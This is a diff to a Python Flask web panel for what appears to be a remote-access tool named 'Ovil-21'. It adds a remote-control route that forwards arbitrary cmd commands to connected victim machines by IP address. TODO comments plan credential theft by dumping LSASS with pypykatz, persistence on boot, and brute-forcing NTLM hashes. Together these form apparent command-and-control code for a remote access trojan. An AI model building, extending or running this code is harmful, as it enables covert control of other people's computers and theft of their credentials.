@@ -8,7 +8,7 @@ from turbo_flask import Turbo
 import pathlib
 from typing import Callable, List, Tuple
 from pathlib import Path
-from flask import Flask, render_template, send_file, request, abort, redirect, url_for
+from flask import Flask, render_template, send_file, request, abort, redirect, url_for, jsonify
 import time
 from network.consts import Massages, UPLOAD_DEFAULT_PATH
 from consts import *
@@ -67,6 +67,7 @@ def connect_by_param() -> str:
     # TODO: add real connection
 
 
+@handle_errors
 def connect(ip: str) -> str:
     if not check_ip(ip):
         return "Invalid IP! try again..."
@@ -627,6 +628,40 @@ def get_user(ip):
     return ovil.send_command("get_user", [])
 
 
+@app.route("/ovil/<ip>/RemoteControl/")
+@handle_errors
+def remote_control(ip):
+    return render_template("RemoteControll.html", ip=ip)
+
+
+@app.route("/ovil/<ip>/RemoteControl/run/", methods=['POST'])
+@handle_errors
+def run(ip):
+    help = "Hi! welcome to Ovil-21's remote control. \n " \
+           "There are only three Types commands here: \n" \
+           "    'run' - runs a cmd command. \n" \
+           "    'run-ovil' - runs a ovil-21 command. \n" \
+           "    'connect/disconnect' - you can understand from the name... \n"
+    data = request.get_json()
+    command = data["method"]
+    params = data["params"]
+    result = {}
+    if command == "help" or command == "?":
+        return help
+    if command == "connect":
+        return connect(ip)
+    if command == "disconnect":
+        return disconnect(ip)
+    if ip not in ovils:
+        return "This ovil is disconnected! Connect and try again"
+    ovil = ovils[ovils.index(ip)]
+    if command == "run-ovil" and len(params) > 0:
+        return str(ovil.send_command(params[0], params[1::]))
+    if command == "run" and len(params) > 0:
+        return ovil.send_command("run", params)
+    return "Invalid Command! try 'help'"
+
+
 def main():
     app.run(debug=False)
 
@@ -634,7 +669,7 @@ def main():
 if __name__ == '__main__':
     main()
 
-# TODO: on shell do that '?' ot 'help' return get commands.
-# TODO: on shell check if the first word is one of my command, else treat this as a regualar cmd
-# TODO: add dumping lssas using 'pypykatz live registry'. Note: you can encrypte using 'pypykatz crypto nt'
+
+# TODO: add support for service page and getting up on boot
+# TODO: make setup file
 # TODO: add decrypting ntlm hash by bruteforce
